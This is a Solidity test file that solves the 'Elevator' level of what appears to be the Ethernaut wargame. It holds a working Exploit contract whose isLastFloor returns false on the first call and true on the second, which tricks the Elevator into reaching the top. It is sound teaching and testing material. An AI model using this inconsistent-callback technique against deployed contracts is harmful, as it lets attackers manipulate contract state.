// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/Elevator.sol";
import "../src/levels/ElevatorFactory.sol";
import "./utils/BaseTest.sol";

contract TestElevator is BaseTest{
    Elevator level;

    constructor() public{
        levelFactory = new ElevatorFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance(true));
        level = Elevator(levelAddress);

        assertEq(level.top(), false);
    }

    function exploitLevel() internal override{
        vm.startPrank(player);
        
        Exploit exploit = new Exploit(level);
        exploit.goTo(5);
        assertEq(level.top(),true);
        assertEq(level.floor(),5);

        vm.stopPrank();
    }
}

contract Exploit is Building {
    Elevator victim;
    address private owner;
    bool isFirst;
    constructor(Elevator _victim) public payable {
        owner = msg.sender;
        victim = _victim;
        isFirst = true;
    }
    function goTo(uint256 _floor) public{
        victim.goTo(_floor);
    }

    function isLastFloor(uint256) external override returns (bool) {
        if(isFirst){
            isFirst = false;
            return false;
        }else{
            return true;
        }
    }
}